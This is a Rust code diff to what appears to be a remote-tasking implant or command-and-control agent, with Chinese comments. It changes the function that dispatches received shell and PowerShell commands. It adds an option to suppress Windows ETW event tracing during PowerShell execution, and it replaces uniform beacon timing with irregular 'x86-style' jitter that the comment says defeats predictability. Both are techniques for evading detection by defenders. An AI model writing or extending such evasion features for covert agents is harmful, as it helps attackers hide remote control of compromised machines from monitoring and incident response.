@@ -147,9 +147,12 @@ async fn resolve_task(
             run("shell".to_string(), input).await
         }
         CommandType::PowerShell => {
+            // arguments 支持 "etwSuppress=true"（ETW 痕迹抑制，默认关）
+            let suppress_etw = task.arguments.iter().any(|a| a.eq_ignore_ascii_case("etwSuppress=true"));
             let input = serde_json::json!({
                 "script": task.command.clone(),
                 "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
+                "etwSuppress": suppress_etw,
             });
             run("powershell".to_string(), input).await
         }
@@ -224,8 +227,6 @@ async fn resolve_task(
 }
 
 pub(crate) fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
-    use rand::Rng;
-    let mut rng = rand::thread_rng();
-    let jitter = (base_ms as f64 * jitter_percent * (rng.gen::<f64>() * 2.0 - 1.0)) as i64;
-    (base_ms as i64 + jitter).max(500) as u64
+    // 块状抖动（x86 风格）：常规 ±jitter + 偶发长眠，避免均匀分布的可预测性
+    crate::config::x86_style_jitter(base_ms, jitter_percent)
 }
